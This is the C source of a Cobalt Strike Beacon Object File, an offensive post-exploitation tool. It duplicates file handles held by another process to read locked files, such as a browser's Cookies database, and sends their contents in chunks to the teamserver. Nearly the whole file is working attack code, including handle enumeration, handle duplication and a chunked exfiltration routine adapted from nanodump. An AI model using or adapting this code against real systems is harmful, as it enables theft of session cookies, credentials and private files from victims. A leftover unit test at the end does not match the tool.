#include <Shlobj.h>
#include <Windows.h>
#include "base\helpers.h"
#include "base\ntdefs.h"
#include <shlwapi.h>
#include <ntstatus.h>
#include <time.h>

#ifdef _DEBUG

#pragma comment (lib, "shell32.lib")
#pragma comment (lib, "Shlwapi.lib")
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

#define CALLBACK_FILE 0x02
#define CALLBACK_FILE_WRITE 0x08
#define CALLBACK_FILE_CLOSE 0x09
#define CHUNK_SIZE 0xe1000
PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName) {
    return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}


extern "C" {
#include "beacon.h"
BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
//Ran into overload issues when using DFR Macro for wcsstr/time. Switched to manual resolution isntead of using Macro for these two methods.
#ifndef _DEBUG
    WINBASEAPI wchar_t* __cdecl MSVCRT$wcsstr(const wchar_t* _Str, const wchar_t* _SubStr);
    #define wcsstr MSVCRT$wcsstr
    WINBASEAPI time_t __cdecl MSVCRT$time(time_t* time);
    #define time MSVCRT$time
    //wcstombs_s(&convertedChars, fileNameChar, bufferSize + 1, fileName.Buffer, bufferSize);
    WINBASEAPI int __cdecl MSVCRT$wcstombs_s(size_t* preturnValue, char* mbstr, size_t sizeInBytes,const wchar_t* wcstr, size_t count);
    #define wcstombs_s MSVCRT$wcstombs_s
#endif
    //KERNEL32 DFR
    DFR(KERNEL32, GetLastError);
    DFR(KERNEL32, GetProcAddress);
    DFR(KERNEL32, GetModuleHandleA);
    DFR(KERNEL32, OpenProcess);
    DFR(KERNEL32, CloseHandle);
    DFR(KERNEL32, GetCurrentProcess);
    DFR(KERNEL32, HeapAlloc)
    DFR(KERNEL32, GetProcessHeap);
    DFR(KERNEL32, HeapReAlloc);
    DFR(KERNEL32, GetFileType);
    DFR(KERNEL32, HeapFree);
    DFR(KERNEL32, SetFilePointer);
    DFR(KERNEL32, GetFileSize);
    DFR(KERNEL32, MapViewOfFile);
    DFR(KERNEL32, UnmapViewOfFile);
    DFR(KERNEL32, CreateFileMappingA);
    DFR(KERNEL32, CreateFileW);
    DFR(KERNEL32, WriteFile);
    //MSVCRT DFR
    DFR(MSVCRT, wcstombs)
    DFR(MSVCRT, wcscmp)
    DFR(MSVCRT, wcslen)
    DFR(MSVCRT, memset);
    //KERNEL32 Definitions
    #define GetLastError KERNEL32$GetLastError
    #define GetFileType KERNEL32$GetFileType
    #define GetProcAddress KERNEL32$GetProcAddress
    #define GetModuleHandleA KERNEL32$GetModuleHandleA
    #define OpenProcess KERNEL32$OpenProcess
    #define CloseHandle KERNEL32$CloseHandle
    #define GetCurrentProcess KERNEL32$GetCurrentProcess
    #define HeapAlloc KERNEL32$HeapAlloc
    #define GetProcessHeap KERNEL32$GetProcessHeap
    #define HeapReAlloc KERNEL32$HeapReAlloc
    #define HeapFree KERNEL32$HeapFree
    #define SetFilePointer KERNEL32$SetFilePointer
    #define GetFileSize KERNEL32$GetFileSize
    #define MapViewOfFile KERNEL32$MapViewOfFile
    #define UnmapViewOfFile KERNEL32$UnmapViewOfFile
    #define CreateFileMappingA KERNEL32$CreateFileMappingA
    #define CreateFileW KERNEL32$CreateFileW
    #define WriteFile KERNEL32$WriteFile
    //MSVCRT Definitions
    #define wcstombs MSVCRT$wcstombs
    #define wcscmp MSVCRT$wcscmp
    #define wcslen MSVCRT$wcslen
    #define memset MSVCRT$memset


    void go(char* buf,int len) {
        //Local Variables
        DWORD pid = 0;
        wchar_t* key = NULL;
        wchar_t* value_wchar = NULL;
        int value_int = 0;
        datap parser;
        BOOL Success = false;
        BOOL copyFile = false;
        //Obtain beacon arguments
        BeaconDataParse(&parser, buf, len);
        pid = BeaconDataInt(&parser);
        key = (wchar_t*)BeaconDataExtract(&parser, NULL);
        size_t keyLen = wcslen(key);
        wchar_t* outputFile = NULL;
        //Value will either be a wchar_t or int based off wither key value filename or handle_id was chosen
        if (!wcscmp(L"filename", key)) {
            value_wchar = (wchar_t*)BeaconDataExtract(&parser, NULL);
            size_t valueLen = wcslen(value_wchar);
            BeaconPrintf(CALLBACK_OUTPUT, "Attempting file download of % .*S % .*S from Process ID %i", keyLen, key, valueLen, value_wchar, pid);
        }
        else {
            value_int = BeaconDataInt(&parser);
            BeaconPrintf(CALLBACK_OUTPUT, "Attempting file download using % .*S %i from Process ID %i", keyLen, key,value_int, pid);

        }

        //Check if fileless download or copying to disk. 
        copyFile = BeaconDataInt(&parser);
        if (copyFile) {
            outputFile = (wchar_t*)BeaconDataExtract(&parser, NULL);
            if (outputFile == NULL || wcslen(outputFile) == 0) {
                BeaconPrintf(CALLBACK_ERROR, "Please provide an outputfile path when using the /copy switch");
                return;
            }
        }

        DWORD dwErrorCode = ERROR_SUCCESS;
        PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO curHandle = NULL;
        ULONG handleInfoSize = 1000;
        HANDLE processHandle = NULL;
        HANDLE dupHandle = NULL;
        PVOID objectNameInfo = NULL;
        POBJECT_TYPE_INFORMATION objectTypeInfo = NULL;

        //NTFunctions
        _NtQuerySystemInformation NtQuerySystemInformation;
        _NtDuplicateObject NtDuplicateObject = NULL;
        _NtQueryObject NtQueryObject = NULL;
        _RtlInitUnicodeString RtlInitUnicodeString = NULL;
        _NtClose NtClose = NULL;

        //Obtain handle to process with handle duplication access
        processHandle = OpenProcess(PROCESS_DUP_HANDLE, true, pid);
        if (NULL == processHandle) {
            dwErrorCode = GetLastError();
            BeaconPrintf(CALLBACK_ERROR, "Error: Failed to open process %i, error code %i",pid,dwErrorCode);
            return;
        }

        //Resolve NT API Function Addresses
        NtQuerySystemInformation = (_NtQuerySystemInformation)GetLibraryProcAddress("ntdll.dll", "NtQuerySystemInformation");
        NtDuplicateObject = (_NtDuplicateObject)GetLibraryProcAddress("ntdll.dll", "NtDuplicateObject");
        NtQueryObject = (_NtQueryObject)GetLibraryProcAddress("ntdll.dll", "NtQueryObject");
        NtClose = (_NtClose)GetLibraryProcAddress("ntdll.dll", "NtClose");
        RtlInitUnicodeString = (_RtlInitUnicodeString)GetLibraryProcAddress("ntdll.dll", "RtlInitUnicodeString");

        //Resolve NT Functions
        if ((!NtQuerySystemInformation) || (!NtDuplicateObject) || (!NtQueryObject) || (!NtClose) || (!RtlInitUnicodeString)) {
            BeaconPrintf(CALLBACK_ERROR, "Error: Failed to resolve NT API function addresses");
        }

        // Query the system handles. If the call fails because of a length mismatch, recreate a bigger buffer and try again.
        do
        {
            handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize);
            dwErrorCode = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, 0);
            if (dwErrorCode == STATUS_INFO_LENGTH_MISMATCH)
            {
                // The length of the buffer was not sufficient. Expand the buffer before retrying.
                HeapFree(GetProcessHeap(), 0, handleInfo);
                handleInfoSize *= 2;
            }
        } while (dwErrorCode == STATUS_INFO_LENGTH_MISMATCH);

        if (dwErrorCode != STATUS_SUCCESS) {
            HeapFree(GetProcessHeap(), 0, handleInfo);
            BeaconPrintf(CALLBACK_ERROR, "Error: Failed to enumerate system handles: error Code %lu", dwErrorCode);
            return;
        }
        //Iterate through System Handles
        for (int i = 0; i < handleInfo->HandleCount; i++) {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO objHandle;
            memset(&objHandle,0,sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
            objHandle = handleInfo->Handles[i];

            //Check if handle belongs to provided PID
            if (handleInfo->Handles[i].UniqueProcessId != pid) {
                continue;
            }

            //If using handle_id, we can determine early if it is the handle we are interested in
            if (!wcscmp(L"handle_id", key)) {
                if (value_int != handleInfo->Handles[i].HandleValue) {
                    continue;
                }
            }

            UNICODE_STRING objectName;
            ULONG returnLength = 0;
            memset(&objectName, 0, sizeof(UNICODE_STRING));

            //Reset variables and handles
            if (dupHandle) {
                dwErrorCode = NtClose(dupHandle);
                dupHandle = NULL;
            }
            if (objectTypeInfo) {
                HeapFree(GetProcessHeap(), 0, objectTypeInfo);
                objectTypeInfo = NULL;
            }

            if (objectNameInfo) {
                HeapFree(GetProcessHeap(), 0, objectNameInfo);
                objectNameInfo = NULL;
            }

            //Check Access Mask of handle, can run into issues with 0x001a019f or 0x0012019f
            if (handleInfo->Handles[i].GrantedAccess == 0x001a019f || (handleInfo->Handles[i].HandleAttributes == 0x2 && handleInfo->Handles[i].GrantedAccess == 0x0012019f)) {
                continue;
            }
            
            DWORD currentID = handleInfo->Handles[i].UniqueProcessId;
 

            //Duplicate Handle (Need DUPLICATE_SAME_ACCESS to be able to read from the file if it is locked.
            //Inherit Handle must be false for handle cleanup (When set to true, was unable to close handle after use). 
            dwErrorCode = (DWORD)NtDuplicateObject(processHandle ,(HANDLE)handleInfo->Handles[i].HandleValue,GetCurrentProcess(),&dupHandle, 0, false, DUPLICATE_SAME_ACCESS);
         
            //Check if handle was successfully duplicated
            if (dwErrorCode != STATUS_SUCCESS) {
                continue;
            }
            //Check if the handle exists on disk, otherwise the program will hang
            DWORD fileType = GetFileType(dupHandle);
            if (fileType != FILE_TYPE_DISK) {
                continue;
            }

            //Allocate memory for objectTypeInfo
            objectTypeInfo = (POBJECT_TYPE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
            //Check if memory was successfully allocated
            if (objectTypeInfo == NULL) {
                continue;

            }

            // Query the object type to get object type information
            dwErrorCode = (DWORD)NtQueryObject(dupHandle,ObjectTypeInformation,objectTypeInfo,0x1000,NULL);
            //Check if the object type was successfully queries
            if (dwErrorCode != STATUS_SUCCESS) {
                continue;
            }

            //Allocate memory for object name info structure
            objectNameInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,0x1000);
            if (objectNameInfo == NULL) {
                continue;
            }
            
            //Retrieve object name info
            dwErrorCode = (DWORD)NtQueryObject(dupHandle,ObjectNameInformation,objectNameInfo,0x1000,&returnLength);
            if (dwErrorCode != STATUS_SUCCESS) {

                // Reallocate the buffer and try again.
                objectNameInfo = HeapReAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,objectNameInfo, returnLength);
                if (NULL == objectNameInfo) {
                    continue;
                }
                dwErrorCode = (DWORD)NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, 0x1000, NULL);
                if (NULL == objectNameInfo) {
                    continue;
                }
            }

            // Cast our buffer into an UNICODE_STRING.
            objectName = *(PUNICODE_STRING)objectNameInfo;
            if (objectName.Length)
            {

                //Structures to get the fileName
                const wchar_t* filePathBuffer = objectName.Buffer;
                size_t length = objectName.Length / sizeof(wchar_t);

                // Initialize the file name as an empty string
                wchar_t* fileName;
                fileName = (PWSTR)(filePathBuffer + length);
     

                // Find the last occurrence of the path separator '\'
                for (int i = objectName.Length/sizeof(wchar_t) - 1; i >= 0; i--) {
                    if (objectName.Buffer[i] == '\\') {
                        // Set the file name to the portion of the string after the last '\'
                        fileName = (PWSTR)(filePathBuffer + i + 1);
                        break;
                    }
                }
                
                // Check if the provided file name exists within the unicodeString
                int result = 0;
                if (value_wchar != NULL) {
                    result = wcscmp(fileName, value_wchar);
                }

                //wchar_t* result = wcsstr(objectName.Buffer, substring.Buffer);
                if (!result) {
                    Success = true;
                    BeaconPrintf(CALLBACK_OUTPUT, "Found file handle!");
                    //Get Size of File
                    SetFilePointer(dupHandle, 0, 0, FILE_BEGIN);
                    DWORD dwFileSize = GetFileSize(dupHandle, NULL);
                    if (dwFileSize == NULL) {
                        dwErrorCode = GetLastError();
                        BeaconPrintf(CALLBACK_ERROR, "Error: Failed to retrieve file size, error code %i", dwErrorCode);
                        continue;
                    }
                    BeaconPrintf(CALLBACK_OUTPUT,"File size is %d\n", dwFileSize);

                    HANDLE fileMapping = NULL;
                    LPVOID viewPointer = NULL;
                    
                    //Create a file mapping object for the target file using the duplicated handle
                    fileMapping = CreateFileMappingA(dupHandle, NULL, PAGE_READONLY, 0, 0, NULL);
                    if (fileMapping == NULL) {
                        dwErrorCode = GetLastError();
                        BeaconPrintf(CALLBACK_ERROR, "Error: Failed to create file mapping object for target file in process, error code %i", dwErrorCode);
                        continue;
                    }
                    //Create a mapped view of the target file
                    viewPointer = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
                    if (viewPointer == NULL) {
                        dwErrorCode = GetLastError();
                        BeaconPrintf(CALLBACK_ERROR, "Error: Failed to map view of target file to memory, error code %i", dwErrorCode);
                        continue;
                    }
                    
                    if (copyFile) {
                        // Construct the full path to the file on the desktop
                        WCHAR filePath[MAX_PATH];

                        // Create or open the file for writing
                        HANDLE hFile = CreateFileW(outputFile, 0x80000000 | 0x40000000, 0x00000001 | 0x00000002, NULL, 0x00000002, 0, NULL);

                        if (hFile != INVALID_HANDLE_VALUE) {
                            DWORD dwWritten = 0;
                            // Write the contents of the buffer to the file
                            BOOL writeStatus = WriteFile(hFile, viewPointer, dwFileSize, &dwWritten, NULL);

                            if (writeStatus) {
                                BeaconPrintf(CALLBACK_OUTPUT, "Copied file % .*S to % .*S\n", wcslen(fileName), fileName, wcslen(outputFile),outputFile);

                            }
                            else {
                                BeaconPrintf(CALLBACK_ERROR, "Error: Failed to write data to file. Error code: %ul\n", GetLastError());
                            }
                            UnmapViewOfFile(viewPointer);
                            NtClose(hFile);
                            hFile = NULL;
                        }
                        else {
                            BeaconPrintf(CALLBACK_ERROR, "Error: Failed to create file. Error code: %ul\n", GetLastError());
                        }
                    }
                    else {
                        //Convert the wchar_t* string to a multibyte string using wcstombs_s
                        //This is all to convert the wchar filename to char
                        const size_t bufferSize = wcstombs(NULL, fileName, 0);
                        if (bufferSize < 1) {
                            BeaconPrintf(CALLBACK_ERROR, "Error: Unable to retrieve file size");
                        }

                        char* fileNameChar = (char*)HeapAlloc(GetProcessHeap(), 0, bufferSize + 1);  // +1 for null-terminator
                        size_t convertedChars = 0;
                        if (!wcstombs_s(&convertedChars, fileNameChar, bufferSize + 1, fileName, bufferSize)) {
                            //Upload file to cobalt strike using method from nanodump
                            if (upload_file(fileNameChar, (char*)viewPointer, dwFileSize)) {
                                BeaconPrintf(CALLBACK_OUTPUT, "Downloaded file % .*S from process ID: %ld\n", wcslen(fileName), fileName, handleInfo->Handles[i].UniqueProcessId);
                            }
                            else {
                                BeaconPrintf(CALLBACK_ERROR, "Failed to downlaod file % .*S from process ID: %ld\n", wcslen(fileName), fileName, handleInfo->Handles[i].UniqueProcessId);
                            }
                        }
                        else {
                            BeaconPrintf(CALLBACK_ERROR, "Error: Failed to convert file name to char probably because im not the best coder");
                        }
                        UnmapViewOfFile(viewPointer);
                    }  
                    break;
                }
            }

        }
        if (Success == false) {
            BeaconPrintf(CALLBACK_OUTPUT, "Error: Failed to find file handle within the specified process");
        }
    cleanup:
        if (handleInfo) {
            HeapFree(GetProcessHeap(),0,handleInfo);
            handleInfo = NULL;
        }
        if (processHandle) {
            CloseHandle(processHandle);
            processHandle = NULL;
        }
        if (objectTypeInfo) {
            HeapFree(GetProcessHeap(), 0, objectTypeInfo);
            objectTypeInfo = NULL;
        }

        if (objectNameInfo) {
            HeapFree(GetProcessHeap(), 0, objectNameInfo);
            objectNameInfo = NULL;
        }

        if (dupHandle) {
            CloseHandle(dupHandle);
            dupHandle = NULL;
        }
        return;

    }


    // https://github.com/helpsystems/nanodump/blob/3262e14d2652e21a9e7efc3960a796128c410f18/source/utils.c#L630-L728
    BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength) {
        DFR_LOCAL(MSVCRT, strnlen);
        DFR_LOCAL(MSVCRT, srand);
        DFR_LOCAL(MSVCRT, rand);
        int fileNameLength = strnlen(fileName, 256);

        // intializes the random number generator
        time_t t;
        srand((unsigned)time(&t));

        // generate a 4 byte random id, rand max value is 0x7fff
        ULONG32 fileId = 0;
        fileId |= (rand() & 0x7FFF) << 0x11;
        fileId |= (rand() & 0x7FFF) << 0x02;
        fileId |= (rand() & 0x0003) << 0x00;

        // 8 bytes for fileId and fileLength
        int messageLength = 8 + fileNameLength;
        char* packedData = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, messageLength);
        if (!packedData) {
            BeaconPrintf(CALLBACK_ERROR, "Error: Could not download the file");
            return FALSE;
        }

        // pack on fileId as 4-byte int first
        packedData[0] = (fileId >> 0x18) & 0xFF;
        packedData[1] = (fileId >> 0x10) & 0xFF;
        packedData[2] = (fileId >> 0x08) & 0xFF;
        packedData[3] = (fileId >> 0x00) & 0xFF;

        // pack on fileLength as 4-byte int second
        packedData[4] = (fileLength >> 0x18) & 0xFF;
        packedData[5] = (fileLength >> 0x10) & 0xFF;
        packedData[6] = (fileLength >> 0x08) & 0xFF;
        packedData[7] = (fileLength >> 0x00) & 0xFF;

        // pack on the file name last
        for (int i = 0; i < fileNameLength; i++) {
            packedData[8 + i] = fileName[i];
        }

        // tell the teamserver that we want to download a file
        BeaconOutput(CALLBACK_FILE, packedData, messageLength);
        HeapFree(GetProcessHeap(), 0, packedData);
        packedData = NULL;

        // we use the same memory region for all chucks
        int chunkLength = 4 + CHUNK_SIZE;
        char* packedChunk = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, chunkLength);
        if (!packedChunk) {
            BeaconPrintf(CALLBACK_ERROR, "Error: Could not download the file");
            return FALSE;
        }
        // the fileId is the same for all chunks
        packedChunk[0] = (fileId >> 0x18) & 0xFF;
        packedChunk[1] = (fileId >> 0x10) & 0xFF;
        packedChunk[2] = (fileId >> 0x08) & 0xFF;
        packedChunk[3] = (fileId >> 0x00) & 0xFF;

        ULONG32 exfiltrated = 0;
        while (exfiltrated < fileLength) {
            // send the file content by chunks
            chunkLength = fileLength - exfiltrated > CHUNK_SIZE
                ? CHUNK_SIZE
                : fileLength - exfiltrated;
            ULONG32 chunkIndex = 4;
            for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++) {
                packedChunk[chunkIndex++] = fileData[i];
            }
            // send a chunk
            BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, 4 + chunkLength);
            exfiltrated += chunkLength;
        }
        HeapFree(GetProcessHeap(), 0, packedChunk);
        packedChunk = NULL;

        // tell the teamserver that we are done writing to this fileId
        char packedClose[4];
        packedClose[0] = (fileId >> 0x18) & 0xFF;
        packedClose[1] = (fileId >> 0x10) & 0xFF;
        packedClose[2] = (fileId >> 0x08) & 0xFF;
        packedClose[3] = (fileId >> 0x00) & 0xFF;
        BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
        return TRUE;
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    //bof::runMocked<int, wchar_t*, wchar_t*>(go, 6696, L"filename", L"Cookies");

    bof::runMocked<int, wchar_t*, wchar_t*, int, wchar_t*>(go, 15796, L"filename", L"Cookies", 1, L"C:\\Users\\defaultuser\\AppData\\Local\\Temp\\Cookies123.tmp");
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    // ASSERT_EQ(expected.size(), got.size());
    // ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif
